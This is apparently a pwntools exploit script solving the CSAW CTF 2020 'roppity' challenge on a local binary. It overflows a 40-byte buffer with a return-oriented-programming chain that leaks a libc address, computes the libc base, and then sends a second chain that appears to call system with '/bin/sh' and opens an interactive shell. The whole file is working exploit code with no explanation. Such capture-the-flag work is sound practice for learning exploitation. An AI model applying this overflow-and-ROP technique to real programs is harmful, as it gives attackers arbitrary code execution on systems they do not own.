from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/bofaeg_challenges/1_csawctf2020_roppity/csawctf2020_roppity")
pwn.gdb.attach(p)
p.recvuntil(b'Hello\n')
payload = b"\x00" * 40
payload += p64(0x40048e) + p64(0x400683) + p64(0x600ff0) + p64(0x4004a0) + p64(0x400683) + p64(0x601880) + p64(0x4004b0) + p64(0x400538) + p64(0x601878) + p64(0x400610)
payload += b"\n"
p.send(payload)
libc_base = u64(p.recv()[0:6].ljust(8,b'\x00')) + -0x21ba0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p64(0x400683) + p64(libc_base + 0x1b3d88) + p64(libc_base + 0x4f420)
payload += b"\n"
p.send(payload)
p.interactive()
